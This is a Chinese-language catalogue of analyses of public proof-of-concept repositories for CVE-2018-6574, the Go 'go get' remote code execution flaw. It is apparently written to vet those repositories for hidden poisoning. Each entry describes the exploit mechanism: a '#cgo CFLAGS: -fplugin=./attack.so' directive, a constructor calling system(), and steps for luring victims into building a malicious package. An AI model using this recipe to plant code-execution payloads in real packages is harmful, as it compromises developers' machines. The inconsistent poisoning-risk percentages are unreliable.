提供的POC代码通过构造一个包含constructor属性的C代码，在编译时自动执行恶意命令`/usr/local/bin/score a321915f-37a6-465f-be95-ce9602f6a9e1`。如果攻击者能够控制 go get 获取的源码，并在其中包含类似的代码，那么这个POC是有效的。

**投毒风险分析：**
提供的POC代码本身没有明显的投毒行为，它只是简单地执行一个命令。是否包含投毒代码需要分析 go get 获取的整个代码仓库，而不仅仅是 attack.c 这个文件。根据目前的信息，无法确定是否存在投毒风险。
提供的 attack.c 代码直接执行预设的命令，没有发现隐藏恶意行为的迹象。假设作者仅提供了已验证可复现漏洞的代码，所以判定投毒风险为0%

**利用方式总结：**
攻击者利用该漏洞，主要是利用了`go get`命令在构建过程中的不安全行为，通过`gcc`或`clang`的插件机制执行恶意代码，达到远程代码执行的目的。攻击的关键在于诱使受害者获取并构建包含恶意插件的Go包。

**项目地址:** [jftierno/-CVE-2018-6574](https://github.com/jftierno/-CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #20

**来源**: [CVE-2018-6574-jftierno_CVE-2018-6574-2.md](../2018/CVE-2018-6574-jftierno_CVE-2018-6574-2.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 用户使用受影响的Go版本执行 `go get` 命令，并下载包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 允许攻击者通过 `go get` 命令执行远程代码。漏洞原因是 Go 在构建过程中没有正确过滤 gcc 或 clang 的插件参数（`-fplugin=` 和 `-plugin=`）。

**有效性：**

提供的 POC 代码 `main.go` 展示了如何利用该漏洞。代码通过 `#cgo CFLAGS: -fplugin=./attack.so` 指令引入一个恶意的 gcc 插件 `attack.so`。当 `go get` 或 `go build` 执行此代码时，gcc/clang 会尝试加载并执行 `attack.so`，从而实现远程命令执行。

**投毒风险：**

由于 POC 代码中引用了外部的 `attack.so` 文件，因此存在投毒风险。虽然代码本身只是声明和调用了一个简单的函数，但是实际的恶意代码存在于 `attack.so` 中。攻击者可以将恶意代码注入到 `attack.so` 中，从而在用户构建项目时执行任意命令。如果用户下载并使用了包含此 `main.go` 和恶意的 `attack.so` 的代码仓库，那么就会受到攻击。投毒风险评估为10%，主要因为代码本身依赖外部文件，增加了复杂性，也更容易被发现。

**利用方式：**

1.  攻击者创建一个包含恶意 `main.go` 和 `attack.so` 的 Go 项目。
2.  `main.go` 包含 `#cgo CFLAGS: -fplugin=./attack.so` 指令。
3.  `attack.so` 包含攻击者想要执行的恶意代码。
4.  攻击者将该项目托管在公共代码仓库（例如 GitHub）上。
5.  攻击者诱骗受害者使用受影响的 Go 版本执行 `go get <攻击者仓库地址>` 命令。
6.  `go get` 命令下载并构建项目，触发 gcc/clang 加载 `attack.so`。
7.  `attack.so` 中的恶意代码被执行，攻击成功。

搜索引擎结果中的 "pentesterlab.com/exercises/cve-2018-6574" 链接提供了一个练习环境，可以用来复现和理解该漏洞。

**总结：**

CVE-2018-6574 是一个严重的安全漏洞，允许攻击者利用 `go get` 命令执行任意代码。为了避免受到攻击，请确保使用最新版本的 Go，并避免下载和构建来自不可信来源的 Go 项目。

**项目地址:** [jftierno/CVE-2018-6574-2](https://github.com/jftierno/CVE-2018-6574-2)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #21

**来源**: [CVE-2018-6574-jftierno_CVE-2018-6574.md](../2018/CVE-2018-6574-jftierno_CVE-2018-6574.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标机器需要安装受影响版本的Go，并且执行`go get`命令拉取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574漏洞允许攻击者在`go get`命令执行期间，通过gcc或clang插件功能执行任意命令。攻击者可以创建一个包含恶意C代码的Go项目，该C代码在编译时被执行。 

**漏洞利用方式：**
1.  攻击者创建一个包含`attack.c`和`main.go`的恶意Go项目。
2.  `attack.c`包含将在编译时执行的恶意代码，例如，利用`system`函数执行任意命令。
3.  `main.go`使用`// #cgo CFLAGS: -fplugin=./attack.so`指示Go编译器使用`attack.so`作为gcc/clang插件。
4.  当用户使用`go get`命令下载并构建该恶意项目时，`attack.c`会被编译成`attack.so`，并作为插件加载，其中的恶意代码将被执行。

**有效性：**
提供的PoC代码是有效的。`attack.c`中的`malicious()`函数使用`system()`函数执行命令`/usr/local/bin/score a321915f-37a6-465f-be95-ce9602f6a9e1`。`main.go`中的`// #cgo CFLAGS: -fplugin=./attack.so`指令使得在构建时加载`attack.so`，从而执行恶意代码。

**投毒风险：**
存在一定的投毒风险，风险占比约10%。虽然PoC的主要功能是演示漏洞利用，但攻击者可能在`attack.c`中添加额外的恶意代码，例如，植入后门、窃取敏感信息等。当前的PoC代码中`/usr/local/bin/score a321915f-37a6-465f-be95-ce9602f6a9e1` 命令比较可疑，如果`score` 命令的功能未知，那么存在潜在的风险。 此外攻击者可能在其他地方加入隐蔽的后门代码，增加了投毒的风险，所以评估投毒风险占比为10%。

**项目地址:** [jftierno/CVE-2018-6574](https://github.com/jftierno/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #22

**来源**: [CVE-2018-6574-lisu60_cve-2018-6574.md](../2018/CVE-2018-6574-lisu60_cve-2018-6574.md)

## CVE-2018-6574-go get 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致系统被完全控制

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 目标系统使用受影响的Go版本，且执行了`go get`命令来获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574允许攻击者利用`go get`命令执行任意代码。漏洞原理是由于受影响的Go版本在构建过程中没有正确过滤`-fplugin`和`-plugin`参数，攻击者可以在代码仓库中包含恶意的gcc/clang插件，当用户使用`go get`下载并构建该仓库时，恶意插件会被执行，从而实现远程命令执行。

**有效性分析：**
提供的POC代码是有效的，它演示了如何利用`-fplugin`选项执行代码。`attack.c`文件包含一个`malicious()`函数，该函数使用`system()`调用执行命令`/usr/local/bin/score cacd042c-6b75-4c9b-b52d-3ebb2f52932e`。`attack.go`文件使用`#cgo CFLAGS: -fplugin=./attack.so`指令告诉go编译器在构建过程中包含该恶意插件。

**投毒风险分析：**
代码本身没有明显的投毒迹象。`attack.c`中执行的命令`/usr/local/bin/score cacd042c-6b75-4c9b-b52d-3ebb2f52932e`看起来像是一个示例或者测试命令，用于验证漏洞是否成功利用。虽然这个命令本身可能是无害的，但攻击者可以修改`attack.c`来执行任何他们想要的恶意命令，这才是真正的风险所在。所以说，从提供的代码来看，投毒的概率为0%，但是不代表攻击者不能进行投毒。

**利用方式分析：**
1.  攻击者创建一个包含恶意代码的Go项目，其中包括`attack.c`和`attack.go`文件，以及`go.mod`文件。
2.  攻击者将该项目托管在一个公开的代码仓库中（如GitHub）。
3.  攻击者诱骗目标用户使用`go get`命令下载并构建该项目。
4.  当目标用户执行`go get`命令时，Go编译器会读取`attack.go`文件中的`#cgo CFLAGS: -fplugin=./attack.so`指令，并将`attack.so`插件加载到构建过程中。
5.  `attack.so`插件中的`malicious()`函数会被执行，从而执行攻击者预先设定的恶意命令。

**项目地址:** [lisu60/cve-2018-6574](https://github.com/lisu60/cve-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #23

**来源**: [CVE-2018-6574-markisback_CVE-2018-6574.md](../2018/CVE-2018-6574-markisback_CVE-2018-6574.md)

## CVE-2018-6574 Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统使用受影响的 Go 版本，并且执行了 `go get` 命令获取恶意代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许在 `go get` 命令构建源代码时执行远程命令。 这是因为 Go 在处理 gcc 或 clang 插件功能时，未正确阻止 `-fplugin=` 和 `-plugin=` 参数。攻击者可以创建一个恶意的 Go 包，其中包含一个 `attack.c` 文件，该文件使用 `__attribute__((constructor))` 定义一个在加载时自动执行的函数 `malicious()`。这个函数会执行任意命令，例如本例中的 `/usr/local/bin/score 9ba57f82-9a67-46fe-885b-682c886cb726`。 `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令来编译和链接 `attack.c` 文件生成的动态链接库 `attack.so`。 当用户使用 `go get` 命令获取并构建这个恶意包时，`attack.so` 会被加载，`malicious()` 函数会被自动执行，从而导致远程命令执行。

**有效性：**提供的 POC 代码有效。当目标系统使用存在漏洞的 Go 版本并执行 `go get` 命令时，攻击者可以通过托管包含恶意代码的仓库来利用此漏洞。

**投毒风险：**提供的代码本身就是一个漏洞利用程序，而非被投毒的代码。此仓库没有发现额外的、作者隐藏的投毒代码。 该POC的主要目标是演示漏洞而不是隐藏恶意代码。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者创建一个包含恶意 `attack.c` 和 `main.go` 文件的 Go 包。
2.  `attack.c` 文件包含一个在加载时自动执行的 `malicious()` 函数，用于执行任意命令。
3.  `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令来编译和链接 `attack.so`。
4.  攻击者将恶意 Go 包托管在一个公开可访问的仓库中。
5.  受害者使用 `go get` 命令获取并构建这个恶意包。
6.  在构建过程中，`attack.so` 被加载，`malicious()` 函数被执行，从而导致远程命令执行。

**项目地址:** [markisback/CVE-2018-6574](https://github.com/markisback/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #24

**来源**: [CVE-2018-6574-memmas_CVE-2018-6574.md](../2018/CVE-2018-6574-memmas_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统需要运行受影响的Go版本，并且执行`go get`命令获取恶意代码仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者通过 `go get` 命令执行任意代码。该漏洞源于 Go 在构建过程中没有正确过滤 gcc 或 clang 的插件参数（`-fplugin=` 和 `-plugin=`）。攻击者可以构造包含恶意 `C` 代码的 Go 项目，利用 `cgo` 特性，在 `go get` 下载并构建该项目时，`C` 代码会被编译并执行，从而实现远程命令执行。

**有效性：**
提供的 POC 代码有效。它包含一个 `exploit.c` 文件，其中定义了一个 `malicious()` 函数，该函数使用 `system()` 函数执行命令 `/usr/local/bin/score 3f9f4915-ab08-4227-9eba-830c2b3ac417`。`__attribute__((constructor))` 确保 `malicious()` 函数在加载动态链接库时自动执行。
`main.go` 文件使用 `cgo` 特性，将 `exploit.so` 作为插件编译到 Go 程序中。当 `go get` 获取并构建这个项目时，`exploit.c` 会被编译成动态链接库，并在程序加载时执行 `malicious()` 函数，从而执行预定的恶意命令。

**投毒风险：**
根据提供的代码，投毒风险为 0%。`exploit.c` 中执行的命令 `/usr/local/bin/score 3f9f4915-ab08-4227-9eba-830c2b3ac417` 明确定义，没有发现隐藏的恶意代码或者其他未知的行为。此仓库只是作为POC验证，触发执行的是给定的命令。

**利用方式：**
1.  **创建恶意 Go 项目：** 攻击者创建一个包含 `exploit.c` 和 `main.go` 文件的 Go 项目。`exploit.c` 包含要执行的恶意代码，`main.go` 使用 `cgo` 特性加载 `exploit.so`。
2.  **托管恶意项目：** 将恶意 Go 项目托管在公共代码仓库（例如 GitHub）上。
3.  **诱导受害者执行 `go get`：** 攻击者诱导受害者在其系统上执行 `go get <恶意项目URL>` 命令。
4.  **远程命令执行：** 当受害者执行 `go get` 命令时，Go 会下载并构建恶意项目。构建过程中，`exploit.c` 会被编译并执行，从而在受害者系统上执行攻击者预设的恶意命令。

**项目地址:** [memmas/CVE-2018-6574](https://github.com/memmas/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #25

**来源**: [CVE-2018-6574-mux0x_CVE-2018-6574.md](../2018/CVE-2018-6574-mux0x_CVE-2018-6574.md)

## CVE-2018-6574 Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许攻击者在构建过程中执行任意代码

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统使用受影响的Go版本，并且执行`go get`命令获取恶意代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许通过`go get`命令执行远程命令，利用了 gcc/clang 插件功能未正确过滤 `-fplugin=` 和 `-plugin=` 参数。攻击者可以创建一个包含恶意代码的Go项目，并在项目的CGO指令中指定恶意的插件。当受害者使用受影响的Go版本通过`go get`获取并构建该项目时，指定的恶意插件会被执行，从而导致远程命令执行。

分析提供的POC代码：

*   `attack.c`：这是一个 C 源代码文件，定义了一个名为 `exploit` 的函数，该函数使用 `system` 函数执行命令 `/usr/local/bin/score afd78b87-2130-4509-be41-e2bc661c338e`。`__attribute__((constructor))` 使得 `exploit` 函数在共享库加载时自动执行。
*   `main.go`：这是一个 Go 源代码文件，它使用 CGO（C Go 接口）来调用 C 代码。`// #cgo CFLAGS: -fplugin=./attack.so` 指令告诉 Go 编译器在构建过程中使用 `attack.so` 作为 gcc/clang 的插件。`attack.so` 是由 `attack.c` 编译生成的共享库。当 `go get` 构建该项目时，会编译 `attack.c` 生成 `attack.so`，然后将其作为插件加载，从而执行 `exploit` 函数中的命令。

**有效性：**

该POC代码有效。通过 `go get` 命令获取并构建包含上述代码的项目，可以触发远程命令执行。

**投毒风险：**

代码本身的功能是明确的：执行一个特定的命令。**并没有隐藏任何其他的后门代码或者恶意行为**。因此，投毒风险为 0%。

**利用方式：**

1.  攻击者创建一个包含恶意 `attack.c` 和 `main.go` 的 Go 项目。
2.  攻击者将该项目托管在公共代码仓库（如 GitHub）。
3.  攻击者诱导受害者使用受影响的 Go 版本执行 `go get <attacker's repository>` 命令。
4.  受害者的 Go 工具链在构建项目时，会加载 `attack.so` 插件，从而执行攻击者指定的任意命令。

**项目地址:** [mux0x/CVE-2018-6574](https://github.com/mux0x/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #26

**来源**: [CVE-2018-6574-paulogmota_CVE-2018-6574.md](../2018/CVE-2018-6574-paulogmota_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统需要安装存在漏洞的Go版本，并运行 `go get` 命令尝试获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞存在于 Go 语言的 `go get` 命令中，允许远程命令执行。攻击者可以通过创建一个包含恶意 `.c` 文件的 Go 项目，并利用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令，在目标系统执行任意命令。

**利用方式：**

1.  攻击者创建一个包含 `main.go` 和 `attack.c`（编译后的 `attack.so`）的恶意 Go 项目，其中 `attack.c` 包含要执行的恶意代码。
2.  `attack.c` 文件使用 `__attribute__((constructor))`  修饰 `malicious()` 函数，使其在动态链接库加载时自动执行。
3.  `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令，告诉 `go` 命令使用 `attack.so` 作为 GCC 插件。
4.  攻击者将该项目托管到 GitHub 等代码仓库。
5.  诱骗目标用户使用 `go get github.com/<your-handle>/<your-hepo>` 命令获取该项目。
6.  当 `go get` 构建项目时，会调用 GCC 并加载 `attack.so` 插件，导致 `malicious()` 函数执行，从而执行攻击者预设的任意命令。

**有效性：**

提供的 POC 代码有效，可以复现该漏洞。

**投毒风险：**

根据提供的代码，没有发现作者隐藏的投毒代码。`attack.c` 中明确包含恶意代码，是漏洞利用的一部分，不应将其视为投毒代码。 因此，投毒风险为 0%。

**搜索引擎结果印证：**

搜索结果中，[webpage 4] 链接指向 pentesterlab 的练习，明确指出该漏洞允许攻击者通过欺骗用户安装恶意包来执行任意代码。其他的搜索结果也都表明了该漏洞的严重性。

**项目地址:** [paulogmota/CVE-2018-6574](https://github.com/paulogmota/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #27

**来源**: [CVE-2018-6574-rootxjs_CVE-2018-6574.md](../2018/CVE-2018-6574-rootxjs_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行和系统完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 用户使用受影响的Go版本执行 `go get` 命令获取恶意Go包。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 允许通过 `go get` 命令执行远程命令。攻击者可以创建一个恶意的 Go 包，其中包含利用 gcc 或 clang 插件功能的恶意代码。当用户使用 `go get` 获取并构建此恶意包时，Go 会执行攻击者插入的恶意代码。

**有效性：**
提供的 POC 代码演示了如何利用 `-fplugin` 选项。`main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令，指示 Go 在编译时加载 `attack.so` 插件。如果 `attack.so` 包含恶意代码，它将在构建过程中执行。这个POC代码表明该漏洞可以被利用。

**投毒风险：**
代码中通过 `-fplugin=./attack.so` 引入外部so文件，如果该so文件不是由代码作者提供或来源不明，则存在投毒风险。虽然POC本身只是一个演示性质的例子，但是一旦被攻击者利用，替换`attack.so`，可能会导致用户在不知情的情况下运行恶意代码。投毒风险估计为10%，因为需要攻击者替换或控制`attack.so`文件。

**利用方式：**
1.  攻击者创建一个包含恶意 `attack.so` 文件的 Go 包。`attack.so` 文件包含攻击者想要执行的任意代码。
2.  攻击者将包含恶意 Go 包的仓库托管在公共服务器上。
3.  攻击者诱使用户使用 `go get` 命令获取此恶意包，例如 `go get github.com/attacker/evilpackage`。
4.  当用户运行 `go get` 命令时，Go 会下载并构建该包。由于 `main.go` 中包含 `#cgo CFLAGS: -fplugin=./attack.so` 指令，构建过程会加载并执行 `attack.so` 中的恶意代码。
5.  恶意代码在用户系统上执行，攻击者可以获得远程代码执行权限。

**项目地址:** [rootxjs/CVE-2018-6574](https://github.com/rootxjs/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #28

**来源**: [CVE-2018-6574-rootxjs_new-CVE-2018-6574.md](../2018/CVE-2018-6574-rootxjs_new-CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程命令执行

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 需要目标机器运行受影响版本的 Go，并且使用 'go get' 命令获取恶意代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者在构建源代码期间，通过 'go get' 命令执行远程命令。这是因为受影响版本的 Go 没有阻止 `-fplugin=` 和 `-plugin=` 参数，这些参数可以被用来加载恶意的 gcc 或 clang 插件。提供的POC代码演示了如何利用此漏洞。它通过在 Go 代码中使用 `#cgo CFLAGS: -fplugin=./plugin.so` 指令来指定一个恶意的插件。当构建此代码时，go 会尝试加载 `./plugin.so`，这使得攻击者能够在目标机器上执行任意代码。根据POC代码内容分析，未发现作者隐藏的投毒代码。

**项目地址:** [rootxjs/new-CVE-2018-6574](https://github.com/rootxjs/new-CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #29

**来源**: [CVE-2018-6574-seoqqq_CVE-2018-6574.md](../2018/CVE-2018-6574-seoqqq_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致系统完全控制

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 用户使用受影响的 Go 版本执行 `go get` 命令从恶意仓库获取代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者利用 `go get` 命令在构建源代码时执行任意命令。该漏洞源于 Go 在处理 gcc 或 clang 插件选项时，未正确阻止 `-fplugin=` 和 `-plugin=` 参数。攻击者可以通过创建一个包含恶意代码的 Go 包，并在该包中利用 CGO 特性，将恶意的编译器选项注入到构建过程中。当用户使用受影响的 Go 版本执行 `go get` 命令来获取并构建该恶意包时，恶意代码将被执行。

**有效性分析：**
提供的 PoC 代码看起来是有效的。`main.go` 文件使用了 CGO 指令 `#cgo CFLAGS: -fplugin=./attack.so`，这正是漏洞利用的关键。这个指令告诉 Go 编译器在构建过程中加载 `attack.so` 插件。`attack.c` 文件定义了一个 `exploit` 函数，该函数使用 `__attribute__((constructor))` 属性，确保在动态链接库加载时自动执行。因此，当 `go get` 命令构建包含 `main.go` 的包时，`attack.so` 会被加载，`exploit` 函数会被执行，从而实现任意命令执行。

**投毒风险分析：**
经过对提供的代码进行分析，没有发现明显的投毒代码。`aaa.c`、`attack.c` 和 `exploit.c` 都包含执行 `/usr/local/bin/score 4a0b3a0c-6593-4414-86ca-c78649e04c0f` 命令的代码或者执行`sleep 20`的代码。这些代码是PoC本身的一部分，旨在验证漏洞。`README.md`是对漏洞的描述说明，`main.go`是触发漏洞的主代码, 所以仓库中作者隐藏的投毒代码可能性为0%。

**利用方式总结：**
1.  **创建恶意 Go 包：** 攻击者创建一个包含 `main.go` 文件的 Go 包，并在 `main.go` 文件中使用 CGO 指令 `#cgo CFLAGS: -fplugin=./attack.so`，指向包含恶意代码的动态链接库。
2.  **创建恶意动态链接库：** 攻击者创建一个动态链接库（例如 `attack.so`），该库包含在加载时自动执行的恶意代码。
3.  **托管恶意包：** 攻击者将恶意 Go 包托管在一个可以通过 `go get` 命令访问的仓库中（例如 GitHub）。
4.  **诱导用户执行 `go get`：** 攻击者诱导用户使用受影响的 Go 版本执行 `go get <malicious_package_url>` 命令来获取并构建恶意包。
5.  **执行恶意代码：** 当用户执行 `go get` 命令时，Go 编译器会加载恶意动态链接库，并执行其中的恶意代码，从而实现远程命令执行。

**项目地址:** [seoqqq/CVE-2018-6574](https://github.com/seoqqq/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #30

**来源**: [CVE-2018-6574-solovvway_CVE-2018-6574.md](../2018/CVE-2018-6574-solovvway_CVE-2018-6574.md)

## CVE-2018-6574

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** Go < 1.8.7, Go 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 目标系统需要使用受影响的Go版本，攻击者需要能够让目标系统通过`go get`获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者在构建 Go 项目时执行任意代码。该漏洞源于 `go get` 命令在处理 gcc 或 clang 插件选项时没有正确过滤 `-fplugin` 和 `-plugin` 参数。攻击者可以通过构造包含恶意 `// #cgo CFLAGS: -fplugin=./attack.so` 的 Go 代码，诱使受害者使用 `go get` 命令下载并构建该项目。构建过程中，会加载攻击者提供的恶意插件（attack.so），从而执行任意代码。

漏洞利用方式：

1.  攻击者创建一个包含恶意代码的 Go 项目。
2.  项目中的 Go 文件包含 `// #cgo CFLAGS: -fplugin=./attack.so` 这样的注释，指定加载恶意的插件。
3.  攻击者将项目托管在公开的代码仓库中。
4.  受害者使用 `go get` 命令获取该项目。
5.  `go get` 在构建项目时，会加载并执行攻击者提供的恶意插件。

根据提供的代码，`attack.c` 文件中定义了一个名为 `malicious` 的函数，该函数使用 `system` 函数执行命令 `/usr/local/bin/score 91e025d6-94e9-4d26-8b86-c00dea0b3129`。这个命令看起来像是用于提交漏洞利用得分的，本身不包含恶意或投毒行为。`main.go` 文件则通过 cgo 技术，将 attack.so 文件编译为插件,并通过 // #cgo CFLAGS指定。

有效性：提供的POC代码有效，能实现远程代码执行。
投毒风险：在给定的代码中，没有发现明显的投毒行为。`attack.c` 中的 system 命令只是执行了一个特定的脚本，用于提交得分，没有发现进一步利用或危害系统的代码。



**项目地址:** [solovvway/CVE-2018-6574](https://github.com/solovvway/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #31

**来源**: [CVE-2018-6574-the-valluvarsploit_CVE-2018-6574.md](../2018/CVE-2018-6574-the-valluvarsploit_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统使用受影响的 Go 版本，且执行 `go get` 命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许在源码构建过程中利用 gcc 或 clang 插件特性执行远程命令。漏洞原因是 Go 在执行 `go get` 时没有正确阻止 `-fplugin=` 和 `-plugin=` 参数。 

**有效性:**

提供的 POC 代码有效。`attack.c` 文件包含一个 `malicious()` 函数，该函数使用 `__attribute__((constructor))` 在程序启动时自动执行 `/usr/local/bin/score 5406e228-19be-4c56-b6da-ee36ce3dee1a` 命令。`main.go` 文件使用 `cgo` 调用 `attack.so` (由 `attack.c` 编译而来)，从而触发恶意代码执行。

**投毒风险:**

提供的代码中没有明显的投毒代码。`attack.c` 的功能很明确，就是执行一个固定的命令。`main.go` 只是为了触发 `attack.c` 中恶意函数的执行。因此，投毒风险评估为 0%。

**利用方式:**

1.  攻击者创建一个包含恶意 `attack.c` 和 `main.go` 文件的 Go 包。
2.  `attack.c` 包含在程序启动时执行任意命令的代码。
3.  `main.go` 利用 `cgo` 技术，通过 `-fplugin=` 选项加载并执行 `attack.c` 编译后的共享库。
4.  攻击者将该恶意 Go 包托管在可访问的存储库中。
5.  受害者在易受攻击的 Go 版本上使用 `go get` 命令下载并构建该恶意包。
6.  构建过程中，`attack.so` 被加载，其中的恶意代码被执行，导致远程命令执行。
7.  `/usr/local/bin/score` 命令被执行，可能导致系统受损或被控制。

**项目地址:** [the-valluvarsploit/CVE-2018-6574](https://github.com/the-valluvarsploit/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #32

**来源**: [CVE-2018-6574-tjcim_cve-2018-6574.md](../2018/CVE-2018-6574-tjcim_cve-2018-6574.md)

## CVE-2018-6574-Go远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者需要使用存在漏洞的Go版本，并通过`go get`命令获取包含恶意代码的包

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许在源代码构建期间执行远程命令。这是因为 Go 在处理 gcc 或 clang 插件功能时，未阻止 `-fplugin=` 和 `-plugin=` 参数。攻击者可以创建一个包含恶意代码的 Go 包，该代码利用这些参数在构建时执行任意命令。提供的 POC 代码通过创建一个共享对象 (`attack.so`)，其中包含一个在加载时执行 `sleep 10` 命令的构造函数。`main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令，在构建时加载该共享对象，从而触发恶意代码的执行。漏洞利用方式是诱使用户使用易受攻击的 Go 版本 `go get` 命令下载并构建包含恶意 `#cgo` 指令的包。由于POC代码明确定义了执行的命令和利用方式，没有发现隐藏的恶意代码，因此投毒风险评估为0%。

**项目地址:** [tjcim/cve-2018-6574](https://github.com/tjcim/cve-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #33

